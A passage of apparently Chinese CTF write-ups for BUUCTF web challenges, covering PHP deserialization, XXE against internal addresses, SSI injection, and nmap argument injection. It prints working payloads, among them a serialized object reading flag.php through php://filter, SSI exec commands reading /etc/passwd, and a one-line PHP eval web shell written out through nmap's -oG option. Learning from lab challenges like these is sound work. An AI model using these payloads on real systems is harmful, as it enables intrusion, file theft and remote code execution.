</li><li><code>__toString</code>:本题中<code>preg_match</code>可调用改函数        </li><li><code>__get</code>: 用于从不可访问的属性读取数据–private或没有初始化的属性；本题中可以以此调用modifier中的$var.     </li></ol><p>将show中的str=实例化的Test<br>Test中的p等于modifier中的var<br>用var利用伪协议读取<code>flag.php</code>       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：</p><pre><code>```php&lt;?phpclass Modifier&#123;        //public $code = 12313;    protected $var = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; &#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;    &#125;&#125;class Test&#123;    public $p;    public function __construct()    ##用于实例化对象    &#123;        $this-&gt;p=new Modifier();    &#125;&#125;$a=new Show(&#39;aa&#39;);$a-&gt;str=new Test();//$a-&gt;str-&gt;p=new Modifier();$c=new show($a);$b=urlencode(serialize($c));echo $b;?&gt;``</code></pre><p>结果：      </p><pre><code>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22aa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D       </code></pre><p>输出base64解码即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/15/BUU053/"/>
    <url>/2021/03/15/BUU053/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[NCTF2019]True XML cookbook<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f8a90def8d4a5fab.png">      </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>之前也做过一道这样的xml<br>抓包<br>直接用之前的payload打一下      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/5d56a3bc80996d6c.png"><br>可以<br>根目录找一下flag—–&gt;没有<br>看WP这道题要打内网的<br>hosts里似乎没啥<br>看<code>/proc/net/arp</code><br>这个文件也有IP地址<br><img src="https://ftp.bmp.ovh/imgs/2021/03/2b8962c67f37597b.png"><br>但直接<code>http://10.0.93.2</code>会报错<br>还要对D段爆破一下    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/7219c14ed0259e73.png">     </p><p><del>不理解。。。。。。。。。。</del><br>这个IP只是本机的IP，还要找到存活的IP      </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>XML<ol><li>用于传输和存储数据</li></ol></li><li><code>&lt;!ENTITY 文件名  SYSTEM &quot;url或协议&quot;&gt;</code>造成文件读取，csrf等  </li></ol><pre><code>     &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;      ##XML声明    &lt;!DOCTYPE a[          ##a--&gt;文件名      &lt;!ENTITY admin SYSTEM &quot;http://10.0.93.11&quot;&gt;     ##admin---&gt;实体名      ]&gt;    &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;          ##&amp;admin;---&gt;实体调用&#123;一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)&#125;          </code></pre><p>XML外部实体<code>admin</code>被赋值为：<code>http://10.0.93.11</code>,在解析XML时，实体<code>admin</code>的值会被替换为<code>http://10.0.93.11</code>的内容值，关键字<code>SYSTEM</code>会告诉XML解析器，<code>admin</code>实体的值将从其后的URL中读取，并把读取的内容替换<code>admin</code>出现的地方。<br>XML支持的协议：<br><img src="https://ftp.bmp.ovh/imgs/2021/03/e8ca3a5eafb7b626.gif">       </p><p>ENTITY 实体，在一个甚至多个XML文档中频繁使用某一条数据，我们可以预先定义一个这条数据的“别名”，即一个ENTITY，然后在这些文档中需要该数据的地方调用它。        </p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/14/BUU052/"/>
    <url>/2021/03/14/BUU052/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF2020]EasySearch<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f23cc01a377b7e84.png">     </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>sql注入了一波，感觉不行<br>看WP说是<code>index.php.swp</code>泄露    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'            ***            ***            &lt;h1>Hello,'</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;/h1>            ******'</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token punctuation">&#125;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><p>只要<code>substr(md5($_POST[&#39;password&#39;]),0,6))==6d0bc1</code>即可登录成功<br>用徐神的脚本跑下     </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">encryption</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>chars<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  code <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add_num <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#纯数字</span>    add_al <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#纯大写字母</span>    add_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span>    <span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#数字和字母</span>    sj <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span>add_str<span class="token punctuation">]</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>sj<span class="token punctuation">,</span>code<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> code<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     start <span class="token operator">=</span> <span class="token string">"6d0bc1"</span> <span class="token comment">#指定前六位</span>     <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        strs <span class="token operator">=</span> generate<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Test %s "</span> <span class="token operator">%</span> strs<span class="token punctuation">)</span>        <span class="token keyword">if</span> encryption<span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"yes!"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[+] %s "</span> <span class="token operator">%</span> strs <span class="token operator">+</span> <span class="token string">"%s "</span> <span class="token operator">%</span> encryption<span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"no!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'完成！'</span><span class="token punctuation">)</span></code></pre></code></pre><p>传入<code>username=123   password=8A6K7P4S6B</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/9f2cf23aebee616d.png"><br><code>.shtml</code>  ???<br>看一下<br><img src="https://ftp.bmp.ovh/imgs/2021/03/89e291278ef0a050.png">      </p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844"><code>SSI注入漏洞</code> </a>    </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>flag在原目录的上级<br>payload：<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>    </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><code>SSI漏洞</code>       </p><ol><li><code>Server-Side Includes Injection</code>服务器包含注入，用于动态页面的指令。SSI就是在HTML文件中，可以通过注释行调用的命令或指针，从而造成的注入脚本或任意代码执行        </li><li>注入条件：Web服务器开启；未对相关关键字过滤；页面中有用户的输入        </li><li>payload：<code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code><a href="https://blog.csdn.net/qq_40657585/article/details/84260844">MORE</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/13/BUU051/"/>
    <url>/2021/03/13/BUU051/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[NPUCTF2020]ReadlezPHP<br><img src="https://ftp.bmp.ovh/imgs/2021/03/574f24b54f71d30b.png">  </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>F12发现源码        </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/d42dac4b31df6db8.png"><br>反序列化<br>有一点需要注意，如果有source——-&gt;<code>die(0)</code><br>所以传参要把前面的source删掉       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><ol><li><code>assert</code>—-&gt;检查一个断言是否为 FALSE，如果括号中是字符串，会将其按代码执行         </li><li><code>call_user_func</code>——&gt;把第一个参数作为回调函数调用       </li></ol><p>flag在phpinfo中<br>payload：     </p><pre><code>```php&lt;?phpcalss HelloPhp&#123;    public $a=&quot;phpinfo&quot;;    public $b=&quot;call_user_func&quot;;&#125;$test=new HelloPhp();echo urlencode(serialize($test));?&gt;//结果O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;&#125;   ```        </code></pre><p>我看有些师傅的WP序列化之前urlencode了一下，这里不加也可       </p><p>但我想到之前做过的一道ACTF的题，也是<code>$b($a)</code>的形式，那道题就必须要urlencode，所以保险起见，还是加上吧     </p><p>assert和eval的区别：      </p><ul><li>assert把整个字符串参数当PHP代码执行，eval把合法的PHP代码执行       </li><li><a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">MORE</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/11/BUU050/"/>
    <url>/2021/03/11/BUU050/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[网鼎杯 2020 朱雀组]Nmap<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c3d85e1949d6f0a2.png">    </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题和之前做过的一道题差不多<code>[BUUCTF 2018]Online Tool</code><br>不过这道题过滤了PHP<br>记一下使用短标签绕过    </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>127.0.0.1&#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code>        </p><p>其他解法        </p><p>payload：<code>127.0.0.1&#39; -iL ../../../../flag -o 1 &#39;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/3668a6d8791e96c0.png">     </p><p><code>-iL</code>扫描文件<br><code>-o</code>将扫描到的内容读入文件</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/10/BUU049/"/>
    <url>/2021/03/10/BUU049/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[WUSTCTF2020]朴实无华<br><img src="https://ftp.bmp.ovh/imgs/2021/03/273a5c946a150017.png">      </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>没啥东西，看看<code>robots.txt</code>         </p><pre><code>User-agent: *Disallow: /fAke_f1agggg.php     </code></pre><p>访问<br><img src="https://ftp.bmp.ovh/imgs/2021/03/3f6fe65b4f82f8c7.png"><br>访问后出现源码      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2020</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">echo</span> <span class="token double-quoted-string string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>去非洲吧</code></pre></code></pre><p>第一个：<br>intval函数——–&gt;获取变量的整数值      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">4.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 4</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'+42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'-42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// -42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">042</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 34</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'042'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">1e10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 1410065408</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'1e10'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 1</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">0x1A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 26</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 42000000</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">420000000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 0</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'420000000000000000000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2147483647</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'42'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 34</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 0</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'foo'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'bar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     